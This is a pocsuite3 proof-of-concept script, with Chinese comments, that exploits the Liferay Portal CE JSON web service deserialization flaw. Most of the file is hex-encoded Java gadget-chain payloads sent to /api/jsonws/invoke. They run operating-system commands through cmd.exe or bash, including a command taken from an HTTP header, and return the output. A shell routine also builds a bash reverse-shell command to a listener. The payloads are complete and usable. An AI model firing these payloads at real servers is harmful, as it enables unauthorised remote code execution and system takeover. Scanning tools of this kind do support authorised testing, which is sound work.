import re
from collections import OrderedDict

from pocsuite3.api \
    import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, get_listener_ip, get_listener_port
from pocsuite3.lib.core.interpreter_option \
    import OptString, OptDict, OptIP, OptPort, OptBool, OptInteger, OptFloat, OptItems
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class DemoPOC(POCBase):
    vulID = '0'                  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'                   # 默认为1
    author = 'seebug'               # PoC作者的大名
    vulDate = '2014-10-16'          # 漏洞公开的时间,不知道就写今天
    createDate = '2014-10-16'       # 编写 PoC 的日期
    updateDate = '2014-10-16'       # PoC 更新的时间,默认和编写时间一样
    references = ['https://xxx.xx.com.cn']      # 漏洞地址来源,0day不用写
    name = 'Liferay Portal CE 反序列化'   # PoC 名称
    appPowerLink = 'https://www.liferay.com/'    # 漏洞厂商主页地址
    appName = 'Liferay'          # 漏洞应用名称
    appVersion = 'versions are 6.2 GA6, 7.0 GA7, 7.1 GA4, and 7.2 GA2'          # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION      # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []                # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []       # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = '''
             - - -
        '''                     # 漏洞简要描述
    pocDesc = ''' 
       Liferay  6.X的回显有问题 ,可能跑不出
             '''                     # POC用法描述

    def verify_7(self,url):
        path = "/api/jsonws/invoke"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                   "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close"}
        win_payload_7_x = '''xxx=echo%2014ae5329006c818a84c6594b366c90c1&cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=o3lt8q1F&formDate=1585270368703&tableId=1&name=2&type=3&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={"userOverridesAsString":"HexAsciiSerializedMap:ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B7870000000027372002B6F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E4265616E436F6D70617261746F72E3A188EA7322A4480200024C000A636F6D70617261746F7271007E00014C000870726F70657274797400124C6A6176612F6C616E672F537472696E673B78707372003F6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078707400106F757470757450726F706572746965737704000000037372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D6571007E00044C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E0020000787000000B8ECAFEBABE0000003200890A0003002207008707002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E010043636F6D2F6C6966657261792F706F7274616C2F6B65726E656C2F73656375726974792F6163636573732F636F6E74726F6C2F416363657373436F6E74726F6C5574696C07002A010017676574416363657373436F6E74726F6C436F6E7465787401004028294C636F6D2F6C6966657261792F706F7274616C2F6B65726E656C2F73656375726974792F617574682F416363657373436F6E74726F6C436F6E746578743B0C002C002D0A002B002E01003C636F6D2F6C6966657261792F706F7274616C2F6B65726E656C2F73656375726974792F617574682F416363657373436F6E74726F6C436F6E7465787407003001000B676574526573706F6E736501002A28294C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0C003200330A0031003401000A6765745265717565737401002928294C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B0C003600370A0031003801001D6A617661782F736572766C65742F536572766C6574526573706F6E736507003A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0C003C003D0B003B003E01000378787808004001001C6A617661782F736572766C65742F536572766C65745265717565737407004201000C676574506172616D65746572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0C004400450B004300460100106A6176612F6C616E672F537472696E67070048010007636D642E65786508004A0100022F6308004C0100116A6176612F6C616E672F52756E74696D6507004E01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C005000510A004F005201000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C005400550A004F00560100116A6176612F6C616E672F50726F6365737307005801000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B0C005A005B0A0059005C0100116A6176612F7574696C2F5363616E6E657207005E010018284C6A6176612F696F2F496E70757453747265616D3B29560C000A00600A005F00610100025C6108006301000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0C006500660A005F00670100076861734E65787401000328295A0C0069006A0A005F006B0100046E65787401001428294C6A6176612F6C616E672F537472696E673B0C006D006E0A005F006F01000008007101000E6A6176612F696F2F5772697465720700730100057772697465010015284C6A6176612F6C616E672F537472696E673B29560C007500760A00740077010005666C7573680C0079000B0A0074007A0100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E736507007C0100256A617661782F736572766C65742F687474702F48747470536572766C65745265717565737407007E0100136A6176612F696F2F5072696E745772697465720700800100135B4C6A6176612F6C616E672F537472696E673B0700820100136A6176612F696F2F496E70757453747265616D07008401000D537461636B4D61705461626C6501001E79736F73657269616C2F50776E65723138303336393035343638383531370100204C79736F73657269616C2F50776E65723138303336393035343638383531373B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002F000E0000000C000100000005000F008800000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000034000E00000020000300000001000F0088000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D00000006000100000038000E0000002A000400000001000F008800000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C000000AF0005000A00000078A70003014CB8002FB600354DB8002FB600394E2CB9003F01003A042D1241B9004702003A0506BD00495903124B535904124D5359051905533A06B800531906B60057B6005D3A07BB005F591907B700621264B600683A081908B6006C99000B1908B60070A7000512723A0919041909B600781904B6007BB100000001008600000025000303FF00630009000507007D07007F07008107004907008307008507005F0000410700490002002000000002002100110000000A000100020023001000097571007E0010000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003C000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E72707701007871007E000D78;"}'''
        linux_payload_7_x = '''xxx=echo%2014ae5329006c818a84c6594b366c90c1&cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=o3lt8q1F&formDate=1585270368703&tableId=1&name=2&type=3&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={"userOverridesAsString":"HexAsciiSerializedMap:ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B7870000000027372002B6F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E4265616E436F6D70617261746F72E3A188EA7322A4480200024C000A636F6D70617261746F7271007E00014C000870726F70657274797400124C6A6176612F6C616E672F537472696E673B78707372003F6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078707400106F757470757450726F706572746965737704000000037372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D6571007E00044C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E0020000787000000B8BCAFEBABE0000003200890A0003002207008707002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E010043636F6D2F6C6966657261792F706F7274616C2F6B65726E656C2F73656375726974792F6163636573732F636F6E74726F6C2F416363657373436F6E74726F6C5574696C07002A010017676574416363657373436F6E74726F6C436F6E7465787401004028294C636F6D2F6C6966657261792F706F7274616C2F6B65726E656C2F73656375726974792F617574682F416363657373436F6E74726F6C436F6E746578743B0C002C002D0A002B002E01003C636F6D2F6C6966657261792F706F7274616C2F6B65726E656C2F73656375726974792F617574682F416363657373436F6E74726F6C436F6E7465787407003001000B676574526573706F6E736501002A28294C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0C003200330A0031003401000A6765745265717565737401002928294C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B0C003600370A0031003801001D6A617661782F736572766C65742F536572766C6574526573706F6E736507003A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0C003C003D0B003B003E01000378787808004001001C6A617661782F736572766C65742F536572766C65745265717565737407004201000C676574506172616D65746572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0C004400450B004300460100106A6176612F6C616E672F537472696E670700480100046261736808004A0100022D6308004C0100116A6176612F6C616E672F52756E74696D6507004E01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C005000510A004F005201000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C005400550A004F00560100116A6176612F6C616E672F50726F6365737307005801000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B0C005A005B0A0059005C0100116A6176612F7574696C2F5363616E6E657207005E010018284C6A6176612F696F2F496E70757453747265616D3B29560C000A00600A005F00610100025C6108006301000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0C006500660A005F00670100076861734E65787401000328295A0C0069006A0A005F006B0100046E65787401001428294C6A6176612F6C616E672F537472696E673B0C006D006E0A005F006F01000008007101000E6A6176612F696F2F5772697465720700730100057772697465010015284C6A6176612F6C616E672F537472696E673B29560C007500760A00740077010005666C7573680C0079000B0A0074007A0100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E736507007C0100256A617661782F736572766C65742F687474702F48747470536572766C65745265717565737407007E0100136A6176612F696F2F5072696E745772697465720700800100135B4C6A6176612F6C616E672F537472696E673B0700820100136A6176612F696F2F496E70757453747265616D07008401000D537461636B4D61705461626C6501001E79736F73657269616C2F50776E65723139313237313934353535313438320100204C79736F73657269616C2F50776E65723139313237313934353535313438323B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002F000E0000000C000100000005000F008800000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000034000E00000020000300000001000F0088000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D00000006000100000038000E0000002A000400000001000F008800000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C000000AF0005000A00000078A70003014CB8002FB600354DB8002FB600394E2CB9003F01003A042D1241B9004702003A0506BD00495903124B535904124D5359051905533A06B800531906B60057B6005D3A07BB005F591907B700621264B600683A081908B6006C99000B1908B60070A7000512723A0919041909B600781904B6007BB100000001008600000025000303FF00630009000507007D07007F07008107004907008307008507005F0000410700490002002000000002002100110000000A000100020023001000097571007E0010000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003C000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E72707701007871007E000D78;"}'''
        req1 = requests.post(url+path,headers=headers,data=win_payload_7_x,timeout=5)
        if "14ae5329006c818a84c6594b366c90c1" in req1.text:
            return 'win'
        else:
            req2 = requests.post(url+path,headers=headers,data=linux_payload_7_x,timeout=5)
            if "14ae5329006c818a84c6594b366c90c1" in req2.text:
                return 'linux'
            else:
                return False

    def _verify(self):
        result = {
            # 不管是验证模式或者攻击模式，返回结果 result 中的 key 值必须按照下面的规范来写
            # [ PoC结果返回规范 ]( https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md#resultstandard )
            'Result': {
                'Info': {'url': 'xxx','version':"",'Desc':'','OS':''}
            }
        }
        output = Output(self)
        url = self.url.rstrip()
        # 验证代码
        path = "/api/jsonws/invoke"
        headers_6x = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                   "cmd2": "echo 14ae5329006c818a84c6594b366c90c1",
                   "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close"}
        poc_6x = '''cmd={"/expandocolumn/update-column":{}}&p_auth=<valid token>&formDate=<date>&columnId=123&name=asdasd&type=1&defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={"userOverridesAsString":"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878;"}'''
        req = requests.post(url+path,headers=headers_6x,data=poc_6x,timeout=5)
        if "14ae5329006c818a84c6594b366c90c1" in req.text:  # result是返回结果
            result['Result']['Info']['url'] = url
            result['Result']['Info']['version'] = '6.x'
            result['Result']['Info']['Desc'] = 'valuable'
            output.success(result)
        elif 'flexjson' in req.text:
            result['Result']['Info']['url'] = url
            result['Result']['Info']['version'] = '6.x'
            result['Result']['Info']['Desc'] = 'Maybe valuable'
            output.success(result)
        elif 'jodd' in req.text:
            r = self.verify_7(url)
            if r:
                result['Result']['Info']['url'] = url
                result['Result']['Info']['version'] = '7.x'
                result['Result']['Info']['Desc'] = 'valuable'
                result['Result']['Info']['OS'] = r
                output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        output = Output(self)
        result = {}
        # 攻击代码
        pass

    def _shell(self):
        """
        shell模式下，只能运行单个PoC脚本，控制台会进入shell交互模式执行命令及输出
        """
        cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
        # 攻击代码 execute cmd
        pass


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(DemoPOC)